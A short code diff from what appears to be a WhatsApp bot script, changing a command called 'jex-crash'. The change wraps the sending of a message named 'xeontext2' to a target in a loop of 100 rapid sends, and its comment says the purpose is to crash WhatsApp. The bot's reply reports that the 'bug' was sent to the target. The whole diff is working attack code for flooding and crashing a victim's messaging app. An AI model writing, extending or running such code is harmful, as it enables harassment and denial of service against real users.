@@ -11244,8 +11244,11 @@ case "jex-crash": {
     
     reply(`*[!] Bug successfully sent to target*`); 
     
-    // Send xeontext2 to target
-    await conn.sendMessage(target, { text: xeontext2 }, { quoted: m });
+    // Send multiple messages rapidly to crash Whatsapp 
+    for (let i = 0; i < 100; i++) {
+        await conn.sendMessage(target, { text: xeontext2 }, { quoted: m });
+       
+    }
     
     break;
 }
